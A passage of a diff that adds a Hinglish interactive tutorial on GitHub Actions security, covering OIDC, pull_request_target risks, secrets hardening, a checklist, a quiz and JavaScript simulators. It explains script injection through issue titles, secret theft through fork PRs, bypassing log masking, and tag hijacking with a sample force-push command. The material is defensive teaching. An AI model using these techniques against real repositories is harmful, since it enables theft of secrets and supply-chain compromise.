+                <li><strong>Problem 3:</strong> Har workflow / branch us secret ko access kar sakta hai agar properly lock na ho.</li>
+              </ul>
+            </div>
+
+            <div class="mini-box" style="border-color: rgba(16, 185, 129, 0.45);">
+              <h4>✅ Modern Pro Tarika: OpenID Connect (OIDC) ⭐</h4>
+              <ul>
+                <li><strong>ZERO static cloud keys</strong> GitHub Secrets mein store karni padti hain!</li>
+                <li>Har job run ke liye GitHub ek signed <strong>short-lived JWT ID Token</strong> issue karta hai.</li>
+                <li>AWS / GCP / Azure us JWT ko verify karke <strong>temporary credentials (~15–60 min)</strong> deta hai — job khatam hote hi expired!</li>
+                <li>Cloud side pe exact rule laga sakte ho: <em>"Sirf <code>dhruv/my-app</code> repo ke <code>main</code> branch ko hi deploy allow karo!"</em></li>
+              </ul>
+            </div>
+          </div>
+        </div>
+
+        <!-- OIDC FLOW VISUALIZER -->
+        <div class="card card-purple">
+          <span class="hinglish-tag tag-purple">Behind The Scenes Magic ✨</span>
+          <h2 class="card-title">🔄 OIDC Flow: GitHub ↔ AWS Bina Password Kaise Trust Karte Hain?</h2>
+
+          <div class="arch-diagram">
+            <div class="arch-box">
+              <h4>🐙 GitHub Actions Job</h4>
+              <div class="arch-item">permissions:<br>&nbsp;&nbsp;id-token: write<br>&nbsp;&nbsp;contents: read</div>
+              <div class="arch-item">uses: aws-actions/configure-aws-credentials@v4</div>
+              <div class="arch-item">Claims inside JWT:<br>repo: "dhruv/my-app"<br>ref: "refs/heads/main"</div>
+            </div>
+
+            <div class="arch-bridge">
+              <div>1. Sends Signed JWT ━━▶</div>
+              <div style="margin: 1rem 0;">2. Verifies Trust Policy ✓</div>
+              <div>◀━━ 3. Temp AWS Token (15m)</div>
+            </div>
+
+            <div class="arch-box aws-box">
+              <h4>☁️ AWS IAM + STS</h4>
+              <div class="arch-item">Identity Provider:<br>token.actions.githubusercontent.com</div>
+              <div class="arch-item">Trust Policy Check:<br>sub == "repo:dhruv/my-app:ref:refs/heads/main"</div>
+              <div class="arch-item" style="color:#6ee7b7;">Issues Temporary STS<br>Access Key + Session Token!</div>
+            </div>
+          </div>
+
+          <div class="code-wrapper">
+            <div class="code-header">
+              <div class="code-filepath"><span class="code-dots"><span></span><span></span><span></span></span>Example: Deploying to AWS using OIDC (Zero Static Secrets!)</div>
+              <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+            </div>
+            <pre><code><span class="y-key">jobs</span>:
+  <span class="y-key">deploy</span>:
+    <span class="y-key">runs-on</span>: <span class="y-str">ubuntu-latest</span>
+<span class="y-hl-green">    <span class="y-key">permissions</span>:
+      <span class="y-key">id-token</span>: <span class="y-str">write</span>   <span class="y-com"># 🔑 GitHub ko JWT mint karne ki permission!</span>
+      <span class="y-key">contents</span>: <span class="y-str">read</span>    <span class="y-com"># 📂 Checkout ke liye read-only permission!</span></span>
+    <span class="y-key">steps</span>:
+      - <span class="y-key">uses</span>: <span class="y-str">actions/checkout@v4</span>
+
+      - <span class="y-key">name</span>: <span class="y-str">Configure AWS Credentials (via OIDC — NO static keys!)</span>
+        <span class="y-key">uses</span>: <span class="y-str">aws-actions/configure-aws-credentials@v4</span>
+        <span class="y-key">with</span>:
+<span class="y-hl">          <span class="y-key">role-to-assume</span>: <span class="y-str">arn:aws:iam::123456789012:role/GitHubActionsDeployRole</span></span>
+          <span class="y-key">aws-region</span>: <span class="y-str">us-east-1</span>
+
+      - <span class="y-key">name</span>: <span class="y-str">Deploy to S3</span>
+        <span class="y-key">run</span>: <span class="y-str">aws s3 sync ./dist s3://my-bucket</span>  <span class="y-com"># ✨ Uses temporary STS creds!</span></code></pre>
+          </div>
+
+          <div class="analogy-box success">
+            <div class="analogy-title">✈️ Passport Analogy for OIDC!</div>
+            Static AWS Key = Apne ghar ki permanent duplicate chabi kisi ko de dena.<br>
+            OIDC = <strong>Airport Boarding Pass + Passport!</strong> GitHub (Government) ne sign karke passport (JWT) diya. AWS (Airport Security) ne stamp verify kiya aur tumhe sirf is flight ke liye 15-minute ka temporary boarding pass de diya!
+          </div>
+        </div>
+
+        <div class="section-footer-nav">
+          <button class="pager-btn" onclick="switchTab('third-party')">← Previous: 3rd-Party Actions</button>
+          <button class="pager-btn primary" onclick="switchTab('fork-hardening')">Next: Fork PRs, Envs &amp; Runners →</button>
+        </div>
+      </section>
+
+      <!-- =============================================================== -->
+      <!-- TAB 6: FORK PRs, ENVIRONMENTS, SECRETS & RUNNERS                -->
+      <!-- =============================================================== -->
+      <section id="fork-hardening" class="tab-content">
+        <div class="card card-amber">
+          <span class="hinglish-tag tag-amber">Open Source &amp; Team Security</span>
+          <h2 class="card-title">🍴 Fork Pull Requests &amp; The Deadly <code>pull_request_target</code> Trap!</h2>
+          <p class="intro-text">
+            Jab koi external contributor tumhare public repo ko fork karke PR bhejta hai, toh GitHub automatically tumhe bachata hai — <strong>jab tak tum galti se <code>pull_request_target</code> ka misuse na karo!</strong>
+          </p>
+
+          <div class="grid-2">
+            <div class="mini-box" style="border-color: rgba(16, 185, 129, 0.4);">
+              <h4>✅ <code>on: pull_request</code> (Safe Default for Forks)</h4>
+              <ul>
+                <li>GitHub automatically <code>GITHUB_TOKEN</code> ko <strong>Read-Only</strong> kar deta hai.</li>
+                <li>Repository <strong>Secrets bilkul pass nahi hote</strong>!</li>
+                <li>First-time contributors ke liye maintainer ka manual <strong>"Approve and run"</strong> approval lagta hai!</li>
+              </ul>
+            </div>
+
+            <div class="mini-box" style="border-color: rgba(239, 68, 68, 0.45);">
+              <h4>☠️ <code>on: pull_request_target</code> (Extreme Caution!)</h4>
+              <ul>
+                <li>Ye <strong>base repo</strong> ke context mein chalta hai — matlab iske paas <strong>Write Token + SAARE SECRETS</strong> hote hain!</li>
+                <li><strong>DEADLY MISTAKE:</strong> Agar iske andar tum <code>actions/checkout</code> ke saath <code>ref: ${{ github.event.pull_request.head.sha }}</code> karke PR ka code run kar do (<code>npm test</code>), toh attacker apne <code>package.json</code> se tumhare saare secrets chura lega!</li>
+                <li>Sirf tab use karo jab PR ka untrusted code run NA karna ho (e.g. sirf PR label lagana).</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <span class="hinglish-tag">Defense-in-Depth</span>
+          <h2 class="card-title">🏰 Secrets, Environments &amp; Runners Hardening</h2>
+
+          <div class="explain-list">
+            <div class="explain-item">
+              <span class="line-pill">Secrets Masking</span>
+              <p>GitHub logs mein secrets ko automatic <code>***</code> se mask karta hai. <strong>Par dhyan rakhna:</strong> agar tum secret ko transform kar do (jaise <code>base64</code> encode ya JSON string split), toh masking bypass ho sakti hai! Kabhi secrets ko echo/print ya artifacts mein save mat karo.</p>
+            </div>
+            <div class="explain-item">
+              <span class="line-pill green">Environments</span>
+              <p>Production secrets ko Repo-level secrets mein mat daalo — unhe ek <strong><code>production</code> Environment</strong> mein rakho with <strong>Required Reviewers</strong> (human approval before deploy) aur <strong>Deployment Branch Rule</strong> (sirf <code>main</code> branch hi prod secrets access kar sake!).</p>
+            </div>
+            <div class="explain-item">
+              <span class="line-pill red">Self-Hosted Runners</span>
+              <p>GitHub-hosted runners (<code>ubuntu-latest</code>) har job ke baad <strong>destroy</strong> ho jaate hain (ephemeral &amp; clean!). <strong>Public repos par kabhi bhi self-hosted runner mat lagao</strong> — warna koi bhi stranger PR bhej kar tumhare private server/network pe persistent malware install kar sakta hai!</p>
+            </div>
+            <div class="explain-item">
+              <span class="line-pill">Secret Scanning</span>
+              <p>Repo Settings → Code security and analysis mein <strong>Secret Scanning + Push Protection</strong> ON rakho — agar koi galti se AWS key code mein commit karega, GitHub push hi block kar dega!</p>
+            </div>
+          </div>
+        </div>
+
+        <div class="section-footer-nav">
+          <button class="pager-btn" onclick="switchTab('oidc-secrets')">← Previous: OIDC</button>
+          <button class="pager-btn primary" onclick="switchTab('audit-quiz')">Next: Audit Checklist &amp; Quiz →</button>
+        </div>
+      </section>
+
+      <!-- =============================================================== -->
+      <!-- TAB 7: AUDIT CHECKLIST & QUIZ                                   -->
+      <!-- =============================================================== -->
+      <section id="audit-quiz" class="tab-content">
+        <div class="card card-green">
+          <span class="hinglish-tag tag-green">Production Security Audit</span>
+          <h2 class="card-title">✅ 7-Point Workflow Security Checklist (Click to Check Off!)</h2>
+          <p class="intro-text">Har naya workflow production mein push karne se pehle ye 7 boxes tick karo:</p>
+
+          <label class="check-item" onclick="toggleCheck(this)">
+            <input type="checkbox">
+            <span><strong>No Script Injection:</strong> Koi bhi untrusted <code>${{ github.event.* }}</code> directly <code>run:</code> ke andar nahi hai — sab <code>env:</code> variable (<code>"$VAR"</code>) ya safe <code>if:</code> expression ke through jaata hai.</span>
+          </label>
+          <label class="check-item" onclick="toggleCheck(this)">
+            <input type="checkbox">
+            <span><strong>Repo Default = Read-Only:</strong> Repo Settings → Actions → Workflow permissions <em>Read-Only</em> pe set hain.</span>
+          </label>
+          <label class="check-item" onclick="toggleCheck(this)">
+            <input type="checkbox">
+            <span><strong>Explicit Minimal <code>permissions:</code></strong> Har job mein sirf wahi exact scopes hain jo chahiye (e.g. <code>issues: write</code> ya <code>contents: read</code>).</span>
+          </label>
+          <label class="check-item" onclick="toggleCheck(this)">
+            <input type="checkbox">
+            <span><strong>Trusted &amp; SHA-Pinned Actions:</strong> Third-party actions audited hain aur sensitive workflows mein full 40-char Commit SHA pe pinned hain (with Dependabot enabled).</span>
+          </label>
+          <label class="check-item" onclick="toggleCheck(this)">
+            <input type="checkbox">
+            <span><strong>OIDC Over Static Keys:</strong> AWS / GCP / Azure deploys ke liye <code>id-token: write</code> + OIDC use ho raha hai (no permanent cloud keys).</span>
+          </label>
+          <label class="check-item" onclick="toggleCheck(this)">
+            <input type="checkbox">
+            <span><strong>Environment Protection:</strong> Production secrets <code>production</code> environment mein locked hain (required reviewers + <code>main</code> branch only).</span>
+          </label>
+          <label class="check-item" onclick="toggleCheck(this)">
+            <input type="checkbox">
+            <span><strong>No Untrusted Checkout in <code>pull_request_target</code>:</strong> Fork PRs ke untrusted code ko kabhi write-privileged/secret-enabled context mein execute nahi kiya ja raha.</span>
+          </label>
+        </div>
+
+        <!-- 6-SCENARIO INTERACTIVE QUIZ -->
+        <div class="card card-purple">
+          <span class="hinglish-tag tag-purple">Feel Check · 6 Security Scenarios</span>
+          <h2 class="card-title">🎯 Test Karo — Ab Kitna Security Feel Aaya?</h2>
+          <p class="intro-text">Har scenario ka best answer choose karo — instant Hinglish explanation milegi!</p>
+
+          <!-- Q1 -->
+          <div class="quiz-card">
+            <div class="quiz-q">1. Ek workflow mein likha hai: <code>run: echo "PR: ${{ github.event.pull_request.title }}"</code>. Isme kya vulnerability hai aur sabse clean fix kya hai?</div>
+            <div class="quiz-opts">
+              <button class="quiz-opt" onclick="checkQuiz(this, false, 'sq1', 'Nahi! Double quotes lagane se injection nahi rukti — attacker title mein khud ek double quote (&quot;) daal kar quote band kar sakta hai!')">Koi issue nahi hai kyunki double quotes lage hain</button>
+              <button class="quiz-opt" onclick="checkQuiz(this, true, 'sq1', '100% Spot On! 🛡️ GitHub ${{ ... }} ko bash se pehle string-replace karta hai. env: PR_TITLE mein daal ke &quot;$PR_TITLE&quot; use karne se bash use pure DATA maanta hai, CODE nahi!')">Script Injection! Fix: <code>env: PR_TITLE: ${{ ... }}</code> aur <code>echo "$PR_TITLE"</code></button>
+              <button class="quiz-opt" onclick="checkQuiz(this, false, 'sq1', 'permissions: read-all se bash command injection nahi rukti! Attacker fir bhi runner pe arbitrary code chala sakta hai.')">Permission issue — <code>permissions: read-all</code> add karo</button>
+            </div>
+            <div class="quiz-feedback" id="sq1"></div>
+          </div>
+
+          <!-- Q2 -->
+          <div class="quiz-card">
+            <div class="quiz-q">2. Tumne ek job mein sirf <code>permissions: issues: write</code> add kiya, aur us job ka pehla step <code>actions/checkout@v4</code> fail hone laga. Kyun?</div>
+            <div class="quiz-opts">
+              <button class="quiz-opt" onclick="checkQuiz(this, true, 'sq2', 'Ekdam sahi! 🎯 Implicit Deny Rule: jaise hi permissions: block add karte ho, baaki SAARE scopes (jaise contents) automatically none ho jaate hain! Isliye contents: read bhi add karna padega.')">Kyunki <code>permissions:</code> add karte hi baaki sab scopes (including <code>contents</code>) auto <code>none</code> ho jaate hain!</button>
+              <button class="quiz-opt" onclick="checkQuiz(this, false, 'sq2', 'Nahi, actions/checkout@v4 bilkul support karta hai — use bas contents: read scope chahiye hota hai!')"><code>actions/checkout@v4</code> custom permissions support nahi karta</button>
+              <button class="quiz-opt" onclick="checkQuiz(this, false, 'sq2', 'issues: write se code checkout nahi milta — code checkout ke liye contents: read chahiye.')"><code>issues: write</code> ko workflow level pe likhna padta hai</button>
+            </div>
+            <div class="quiz-feedback" id="sq2"></div>
+          </div>
+
+          <!-- Q3 -->
+          <div class="quiz-card">
+            <div class="quiz-q">3. Ek third-party action ko supply-chain tag-hijack attack se bachane ka sabse secure tarika kaunsa hai?</div>
+            <div class="quiz-opts">
+              <button class="quiz-opt" onclick="checkQuiz(this, false, 'sq3', 'Sabse risky! @main branch pe koi bhi naya commit turant tumhare workflow mein run ho jaayega.')"><code>uses: org/action@main</code></button>
+              <button class="quiz-opt" onclick="checkQuiz(this, false, 'sq3', 'Tags mutable hote hain! Compromised author v2 tag ko force-push karke malicious commit pe point kar sakta hai.')"><code>uses: org/action@v2</code></button>
+              <button class="quiz-opt" onclick="checkQuiz(this, true, 'sq3', 'BINGO! 🔥 Full 40-char Commit SHA cryptographically immutable hota hai — hacker tag move kar bhi de, tumhara workflow wahi audited commit chalayega!')"><code>uses: org/action@&lt;40-char-commit-sha&gt;</code></button>
+            </div>
+            <div class="quiz-feedback" id="sq3"></div>
+          </div>
+
+          <!-- Q4 -->
+          <div class="quiz-card">
+            <div class="quiz-q">4. Tum AWS S3 pe deploy karna chahte ho <strong>bina</strong> GitHub Secrets mein static <code>AWS_ACCESS_KEY_ID</code> store kiye. Tumhe kya setup karna hoga?</div>
+            <div class="quiz-opts">
+              <button class="quiz-opt" onclick="checkQuiz(this, false, 'sq4', 'GITHUB_TOKEN sirf GitHub API ke liye hota hai, AWS account mein directly authenticate nahi kar sakta!')">Sirf <code>secrets.GITHUB_TOKEN</code> use karo</button>
+              <button class="quiz-opt" onclick="checkQuiz(this, true, 'sq4', 'Perfect! 🔐 OIDC + permissions: id-token: write se GitHub signed JWT deta hai, aur AWS IAM short-lived temporary credentials issue karta hai — zero static secrets!')">OpenID Connect (OIDC) + <code>permissions: id-token: write</code> + AWS IAM Role</button>
+              <button class="quiz-opt" onclick="checkQuiz(this, false, 'sq4', 'Kabhi nahi! Code/YAML mein secrets hardcode karna sabse badi security mistake hai.')">AWS keys ko <code>env:</code> mein plain text daal do</button>
+            </div>
+            <div class="quiz-feedback" id="sq4"></div>
+          </div>
+
+          <!-- Q5 -->
+          <div class="quiz-card">
+            <div class="quiz-q">5. <code>label-issues-real.yml</code> mein <code>if: contains(github.event.issue.title, 'bug')</code> use kiya gaya hai. Kya ye line Script Injection ke liye vulnerable hai?</div>
+            <div class="quiz-opts">
+              <button class="quiz-opt" onclick="checkQuiz(this, false, 'sq5', 'Nahi! Script injection tab hoti hai jab untrusted text shell (bash/pwsh) parser mein paste ho. if: expression GitHub ke safe evaluator mein chalta hai, bash mein nahi!')">Haan, kyunki <code>issue.title</code> untrusted hai</button>
+              <button class="quiz-opt" onclick="checkQuiz(this, true, 'sq5', 'Bilkul sahi! 🧠 Workflow if: expressions GitHub ke safe expression engine mein evaluate hote hain, shell command ki tarah execute nahi hote — isliye zero bash injection risk!')">Nahi! <code>if:</code> GitHub ke safe expression engine mein evaluate hota hai, bash mein nahi</button>
+              <button class="quiz-opt" onclick="checkQuiz(this, false, 'sq5', 'Private repos mein bhi compromised team member ya external integration issue khol sakta hai, par if: har jagah safe hai.')">Sirf private repo mein safe hai</button>
+            </div>
+            <div class="quiz-feedback" id="sq5"></div>
+          </div>
+
+          <!-- Q6 -->
+          <div class="quiz-card">
+            <div class="quiz-q">6. Public open-source repo mein <code>on: pull_request_target</code> workflow ke andar tum PR ke fork ka code checkout karke <code>npm test</code> chala rahe ho. Kya risk hai?</div>
+            <div class="quiz-opts">
+              <button class="quiz-opt" onclick="checkQuiz(this, true, 'sq6', 'NAILED IT! 🚨 pull_request_target base repo ke write token aur secrets ke saath chalta hai! Fork ka untrusted code run karne se koi bhi stranger tumhare saare secrets chura sakta hai!')">HIGH RISK! Attacker PR mein malicious test script daal kar tumhare SAARE repo secrets chura sakta hai!</button>
+              <button class="quiz-opt" onclick="checkQuiz(this, false, 'sq6', 'Galat! Wo protection sirf on: pull_request mein milti hai, pull_request_target mein NAHI!')">Koi risk nahi — GitHub fork PRs ko secrets nahi deta</button>
+              <button class="quiz-opt" onclick="checkQuiz(this, false, 'sq6', 'npm test arbitrary JS/shell code run kar sakta hai (including package.json scripts!).')">Sirf <code>npm run build</code> risky hai, <code>npm test</code> safe hai</button>
+            </div>
+            <div class="quiz-feedback" id="sq6"></div>
+          </div>
+        </div>
+
+        <div class="section-footer-nav">
+          <button class="pager-btn" onclick="switchTab('fork-hardening')">← Previous: Fork PRs &amp; Hardening</button>
+          <button class="pager-btn primary" onclick="switchTab('big-picture')">↺ Back to Start</button>
+        </div>
+      </section>
+
+    </main>
+  </div>
+
+  <script>
+    // =====================================================
+    // 1. SIDEBAR TAB SWITCHING + PROGRESS BAR
+    // =====================================================
+    const tabOrder = [
+      'big-picture',
+      'script-injection',
+      'permissions',
+      'third-party',
+      'oidc-secrets',
+      'fork-hardening',
+      'audit-quiz'
+    ];
+
+    function switchTab(tabId) {
+      document.querySelectorAll('.nav-btn').forEach(btn => {
+        btn.classList.toggle('active', btn.dataset.tab === tabId);
+      });
+      document.querySelectorAll('.tab-content').forEach(sec => {
+        sec.classList.toggle('active', sec.id === tabId);
+      });
+
+      const idx = tabOrder.indexOf(tabId);
+      if (idx !== -1) {
+        const pct = ((idx + 1) / tabOrder.length) * 100;
+        document.getElementById('progress-fill').style.width = pct + '%';
+        document.getElementById('progress-label').textContent = (idx + 1) + ' / ' + tabOrder.length;
+      }
+
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+    }
+
+    // =====================================================
+    // 2. SUB-TABS & COPY CODE
+    // =====================================================
+    function switchSubTab(btn, panelId) {
+      const tabGroup = btn.parentElement;
+      tabGroup.querySelectorAll('.sub-tab-btn').forEach(b => b.classList.remove('active'));
+      btn.classList.add('active');
+
+      let el = tabGroup.nextElementSibling;
+      while (el && el.classList.contains('sub-panel')) {
+        el.classList.remove('active');
+        el = el.nextElementSibling;
+      }
+      const target = document.getElementById(panelId);
+      if (target) target.classList.add('active');
+    }
+
+    function copyCode(btn) {
+      const pre = btn.closest('.code-wrapper').querySelector('pre');
+      navigator.clipboard.writeText(pre.innerText).then(() => {
+        const old = btn.textContent;
+        btn.textContent = 'Copied ✓';
+        btn.classList.add('copied');
+        setTimeout(() => {
+          btn.textContent = old;
+          btn.classList.remove('copied');
+        }, 1500);
+      });
+    }
+
+    function escapeHtml(str) {
+      return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+    }
+
+    // =====================================================
+    // 3. LIVE SCRIPT INJECTION SIMULATOR
+    // =====================================================
+    let injMode = 'vuln';
+
+    function setInjMode(mode) {
+      injMode = mode;
+      renderInjSim();
+    }
+
+    function setInjPayload(text) {
+      document.getElementById('inj-input').value = text;
+      renderInjSim();
+    }
+
+    function renderInjSim() {
+      const title = document.getElementById('inj-input').value;
+      const safeTitleHtml = escapeHtml(title);
+
+      document.getElementById('inj-mode-vuln').className = 'sim-toggle' + (injMode === 'vuln' ? ' active-red' : '');
+      document.getElementById('inj-mode-safe').className = 'sim-toggle' + (injMode === 'safe' ? ' active-green' : '');
+
+      const stepBox = document.getElementById('inj-step-script');
+      const numEl = document.getElementById('inj-s1-num');
+      const scriptEl = document.getElementById('inj-generated-script');
+      const term = document.getElementById('inj-terminal');
+
+      const hasQuoteBreak = title.includes('"');
+      const hasSubshell = title.includes('$(') || title.includes('`');
+      const isMalicious = hasQuoteBreak || hasSubshell;
+
+      if (injMode === 'vuln') {
+        stepBox.className = 'pipeline-step ' + (isMalicious ? 'step-danger' : '');
+        numEl.className = 'step-number ' + (isMalicious ? 'red' : '');
+
+        scriptEl.innerHTML =
+          `<span class="y-com"># GitHub blindly pastes issue title into bash script BEFORE running!</span>\n` +
+          `issue_title="<span class="${isMalicious ? 'y-bad' : 'y-str'}">${safeTitleHtml}</span>"\n` +
+          `if [[ "$issue_title" == *"bug"* ]]; then\n` +
+          `  echo "Issue is about a bug!"\n` +
+          `else\n` +
+          `  echo "Issue is not about a bug"\n` +
+          `fi`;
+
+        if (hasQuoteBreak) {
+          term.innerHTML =
+            `<div><span class="term-blue">$</span> bash /home/runner/work/_temp/step1.sh</div>` +
+            `<div><span class="term-red">🚨 INJECTION EXECUTED!</span> Double quote <code>"</code> closed <code>issue_title</code> early!</div>` +
+            `<div><span class="term-red">💀 ATTACKER SHELL COMMAND RAN ON YOUR RUNNER VM:</span></div>` +
+            `<div><span class="term-amber">▶</span> ${safeTitleHtml}</div>` +
+            `<div><span class="term-red">✖ Compromised!</span> Attacker can read env vars, exfiltrate secrets, or backdoor build artifacts!</div>`;
+        } else if (hasSubshell) {
+          term.innerHTML =
+            `<div><span class="term-blue">$</span> bash /home/runner/work/_temp/step1.sh</div>` +
+            `<div><span class="term-red">🚨 SUBSHELL INJECTION EXECUTED!</span> Even INSIDE double quotes, bash executes <code>$(...)</code> or backticks!</div>` +
+            `<div><span class="term-red">💀 Command inside <code>$()</code> ran directly on your runner VM!</span></div>` +
+            `<div><span class="term-amber">▶</span> ${safeTitleHtml}</div>`;
+        } else {
+          const isBug = title.includes('bug');
+          term.innerHTML =
+            `<div><span class="term-blue">$</span> bash /home/runner/work/_temp/step1.sh</div>` +
+            `<div><span class="term-green">▶</span> ${isBug ? 'Issue is about a bug!' : 'Issue is not about a bug'}</div>` +
+            `<div><span class="term-amber">⚠️ Warning:</span> Is title mein koi special char nahi tha toh bach gaye — par koi bhi stranger <code>"</code> ya <code>$()</code> daal kar ise turant hack kar sakta hai!</div>`;
+        }
+      } else {
+        stepBox.className = 'pipeline-step step-success';
+        numEl.className = 'step-number green';
+
+        scriptEl.innerHTML =
+          `<span class="y-com"># OS Environment: TITLE = ${safeTitleHtml} (stored safely in memory!)</span>\n` +
+          `<span class="y-com"># Bash script text NEVER changes, no matter what attacker types!</span>\n` +
+          `if [[ "<span class="y-str">$TITLE</span>" == *"bug"* ]]; then\n` +
+          `  echo "Issue is about a bug!"\n` +
+          `else\n` +
+          `  echo "Issue is not about a bug"\n` +
+          `fi`;
+
+        const isBug = title.includes('bug');
+        term.innerHTML =
+          `<div><span class="term-blue">$</span> TITLE="${safeTitleHtml}" bash /home/runner/work/_temp/step1.sh</div>` +
+          `<div><span class="term-green">🛡️ SAFE!</span> Bash treated the entire <code>$TITLE</code> strictly as a literal text string (DATA, not CODE)!</div>` +
+          `<div><span class="term-green">▶ Output:</span> ${isBug ? 'Issue is about a bug!' : 'Issue is not about a bug'}</div>` +
+          `<div><span class="term-blue">✅ Zero injected commands ran!</span> Quotes, semicolons, aur <code>$()</code> sab neutralized!</div>`;
+      }
+    }
+
+    // =====================================================
+    // 4. LIVE PERMISSIONS SIMULATOR
+    // =====================================================
+    const permState = { repo: 'read-only', job: 'unset' };
+
+    function setPermSim(key, val) {
+      permState[key] = val;
+      renderPermSim();
+    }
+
+    function renderPermSim() {
+      const { repo, job } = permState;
+
+      document.getElementById('perm-repo-ro').className = 'sim-toggle' + (repo === 'read-only' ? ' active-green' : '');
+      document.getElementById('perm-repo-rw').className = 'sim-toggle' + (repo === 'read-write' ? ' active-red' : '');
+      document.getElementById('perm-job-none').className = 'sim-toggle' + (job === 'unset' ? ' active' : '');
+      document.getElementById('perm-job-issues').className = 'sim-toggle' + (job === 'issues-write' ? ' active-green' : '');
+      document.getElementById('perm-job-both').className = 'sim-toggle' + (job === 'issues-and-contents' ? ' active-green' : '');
+
+      // Calculate effective scopes
+      let issuesScope = 'none';
+      let contentsScope = 'none';
+
+      if (job === 'unset') {
+        if (repo === 'read-only') {
+          issuesScope = 'read';
+          contentsScope = 'read';
+        } else {
+          issuesScope = 'write';
+          contentsScope = 'write';
+        }
+      } else if (job === 'issues-write') {
+        issuesScope = 'write';
+        contentsScope = 'none'; // Implicit deny!
+      } else if (job === 'issues-and-contents') {
+        issuesScope = 'write';
+        contentsScope = 'read';
+      }
+
+      // Row 1: Label API
+      const r1 = document.getElementById('perm-res-label');
+      const r1d = document.getElementById('perm-res-label-desc');
+      const r1b = document.getElementById('perm-res-label-badge');
+      if (issuesScope === 'write') {
+        r1.className = 'pipeline-step step-success';
+        r1d.innerHTML = `<code>issues: write</code> granted! GitHub API accepts POST and adds <code>"bug"</code> label.`;
+        r1b.className = 'step-badge green';
+        r1b.textContent = '200 OK ✓';
+      } else {
+        r1.className = 'pipeline-step step-danger';
+        r1d.innerHTML = `Effective scope is <code>issues: ${issuesScope}</code> — POST fails with <code>--fail</code>!`;
+        r1b.className = 'step-badge red';
+        r1b.textContent = '403 FORBIDDEN ❌';
+      }
+
+      // Row 2: Checkout
+      const r2 = document.getElementById('perm-res-checkout');
+      const r2d = document.getElementById('perm-res-checkout-desc');
+      const r2b = document.getElementById('perm-res-checkout-badge');
+      if (contentsScope === 'read' || contentsScope === 'write') {
+        r2.className = 'pipeline-step step-success';
+        r2d.innerHTML = `<code>contents: ${contentsScope}</code> allows cloning repository code.`;
+        r2b.className = 'step-badge green';
+        r2b.textContent = 'ALLOWED ✓';
+      } else {
+        r2.className = 'pipeline-step step-skipped';
+        r2d.innerHTML = `<strong>Implicit Deny!</strong> Since only <code>issues: write</code> was specified, <code>contents</code> became <code>none</code>. (Not needed in <code>label-issues-real.yml</code>, par checkout lagana ho toh <code>contents: read</code> add karo!)`;
+        r2b.className = 'step-badge amber';
+        r2b.textContent = 'DENIED (none)';
+      }
+
+      // Row 3: Malicious push
+      const r3 = document.getElementById('perm-res-hack');
+      const r3d = document.getElementById('perm-res-hack-desc');
+      const r3b = document.getElementById('perm-res-hack-badge');
+      if (contentsScope === 'write') {
+        r3.className = 'pipeline-step step-danger';
+        r3d.innerHTML = `<strong>DANGER!</strong> Overly permissive token gives <code>contents: write</code>! A compromised step can push backdoor code directly to <code>main</code>!`;
+        r3b.className = 'step-badge red';
+        r3b.textContent = 'REPO HIJACKED 💀';
+      } else {
+        r3.className = 'pipeline-step step-success';
+        r3d.innerHTML = `<strong>BLOCKED!</strong> Token has <code>contents: ${contentsScope}</code> — hacker CANNOT push code, create releases, or touch packages!`;
+        r3b.className = 'step-badge green';
+        r3b.textContent = 'BLOCKED 🛡️';
+      }
+
+      const term = document.getElementById('perm-terminal');
+      term.innerHTML =
+        `<div><span class="term-blue">Effective GITHUB_TOKEN Scopes:</span> <code>issues: ${issuesScope}</code> · <code>contents: ${contentsScope}</code> · <code>packages: ${job === 'unset' && repo === 'read-write' ? 'write' : 'none'}</code></div>` +
+        (job === 'unset' && repo === 'read-only'
+          ? `<div><span class="term-red">✖ curl: (22) The requested URL returned error: 403</span> — "Resource not accessible by integration" (Fix: add <code>permissions: issues: write</code>!)</div>`
+          : job === 'unset' && repo === 'read-write'
+          ? `<div><span class="term-amber">⚠️ Label worked, BUT Blast Radius is HUGE!</span> Token has write access to code, PRs, packages, deployments — violates Least Privilege!</div>`
+          : `<div><span class="term-green">✅ PERFECT LEAST PRIVILEGE!</span> Label works (200 OK) AND malicious code push / package tampering is 100% blocked!</div>`);
+    }
+
+    // =====================================================
+    // 5. TAG HIJACK VS COMMIT SHA PINNING SIMULATOR
+    // =====================================================
+    function setPinMode(mode) {
+      document.getElementById('pin-btn-branch').className = 'sim-toggle' + (mode === 'branch' ? ' active-red' : '');
+      document.getElementById('pin-btn-tag').className = 'sim-toggle' + (mode === 'tag' ? ' active-amber' : '');
+      document.getElementById('pin-btn-sha').className = 'sim-toggle' + (mode === 'sha' ? ' active-green' : '');
+
+      const badge = document.getElementById('pin-badge');
+      const code = document.getElementById('pin-code');
+      const term = document.getElementById('pin-terminal');
+
+      if (mode === 'branch') {
+        badge.className = 'step-badge red';
+        badge.textContent = 'Risk: CRITICAL ☠️';
+        code.innerHTML = `<code>- <span class="y-key">name</span>: <span class="y-str">Run third-party linter</span>
+<span class="y-hl-red">  <span class="y-key">uses</span>: <span class="y-str">random-dev/cool-linter@main</span>  <span class="y-com"># ☠️ NEVER pin to a branch!</span></span></code>`;
+        term.innerHTML =
+          `<div><span class="term-blue">$</span> Resolving <code>random-dev/cool-linter@main</code>...</div>` +
+          `<div><span class="term-red">💀 COMPROMISED!</span> Hacker pushed evil commit <code>f9e8d7...</code> to <code>main</code>.</div>` +
+          `<div><span class="term-red">✖</span> Your workflow silently downloaded and executed attacker's code with your secrets!</div>`;
+      } else if (mode === 'tag') {
+        badge.className = 'step-badge amber';
+        badge.textContent = 'Risk: MODERATE ⚠️';
+        code.innerHTML = `<code>- <span class="y-key">name</span>: <span class="y-str">Run third-party linter</span>
+<span class="y-hl-amber">  <span class="y-key">uses</span>: <span class="y-str">random-dev/cool-linter@v1</span>    <span class="y-com"># ⚠️ Mutable Git tag! Can be force-moved!</span></span></code>`;
+        term.innerHTML =
+          `<div><span class="term-blue">$</span> Resolving tag <code>v1</code>...</div>` +
+          `<div><span class="term-amber">⚠️ TAG HIJACKED!</span> Compromised author ran <code>git tag -f v1 f9e8d7 &amp;&amp; git push -f --tags</code>!</div>` +
+          `<div><span class="term-red">💀</span> <code>@v1</code> now points to evil commit <code>f9e8d7...</code>! (OK for trusted official <code>actions/*</code>, risky for unknown authors!)</div>`;
+      } else {
